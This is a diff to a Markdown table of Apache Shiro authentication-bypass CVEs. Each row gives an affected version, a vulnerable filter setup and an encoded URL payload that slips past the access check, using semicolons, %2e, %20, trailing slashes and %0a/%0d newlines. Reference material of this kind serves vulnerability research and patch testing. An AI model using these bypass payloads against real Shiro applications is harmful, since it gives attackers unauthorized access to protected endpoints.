@@ -32,8 +32,8 @@
 | CVE-2019-12422/SHIRO-721 | shiro < 1.4.2        | -                       | RememberMe、Padding Oracle Attack、CBC |
 | CVE-2020-1957/SHIRO-682 | shiro < 1.5.2        | /** = anon             | /toJsonPOJO/、Spring Boot < 2.3.0.RELEASE -> /xx/..;/toJsonPOJO |
 | CVE-2020-11989/SHIRO-782 | shiro < 1.5.3        | (等于1.5.2）/toJsonList/* = authc；(小于1.5.3）/alter/* = authc && /** = anon | (等于1.5.2）/的两次编码 -> %25%32%66 /toJsonList/a%25%32%66a ->/toJsonList/a%2fa；（小于1.5.3）/;/shirodemo/alter/test -> /shirodemo/alter/test (Shiro < 1.5.2版本的话，根路径是什么没有关系) |
-| CVE-2020-13933     | shiro < 1.6.0              | /hello/* = authc          | /hello/%3ba             |
-| CVE-2020-17510    | shiro < 1.7.0              | /hello/* = authc          | /hello/%2e              |
-| CVE-2020-17523    | shiro < 1.7.1              | /hello/* = authc          | /hello/%20              |
-| CVE-2021-41303    | shiro < 1.8.0              | /admin/* = authc && /admin/page = anon | /admin/page/         |
-| CVE-2022-32532    | shiro < 1.9.1              | RegExPatternMatcher && /alter/.* |                        |
+| CVE-2020-13933     | shiro < 1.6.0              | /hello/* = authc          | /hello/%3ba -> /hello/;a |
+| CVE-2020-17510    | shiro < 1.7.0              | /hello/* = authc          | /hello/%2e -> /hello/. (/%2e、/%2e/、/%2e%2e、/%2e%2e/都可以) |
+| CVE-2020-17523    | shiro < 1.7.1              | /hello/* = authc          | /hello/%20 -> /hello/%20 |
+| CVE-2021-41303    | shiro < 1.8.0              | /admin/* = authc && /admin/page = anon | /admin/page/ -> /admin/page |
+| CVE-2022-32532    | shiro < 1.9.1              | RegExPatternMatcher && /alter/.* | /alter/a%0aaa -> /alter/a%0aaa;/alter/a%0daa -> /alter/a%0daa |
